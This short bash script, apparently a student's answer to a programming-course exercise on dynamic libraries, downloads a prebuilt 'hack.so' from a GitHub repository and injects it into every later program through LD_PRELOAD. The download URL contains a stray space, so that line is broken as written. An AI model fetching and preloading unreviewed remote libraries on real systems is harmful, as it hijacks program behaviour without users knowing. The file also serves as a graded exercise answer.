#!/bin/bash
wget -P .. https://raw.githubusercontent .com/denireal/alx-low_level_programming/master/0x18-dynamic_libraries/hack.so
export LD_PRELOAD="$PWD/../hack.so"
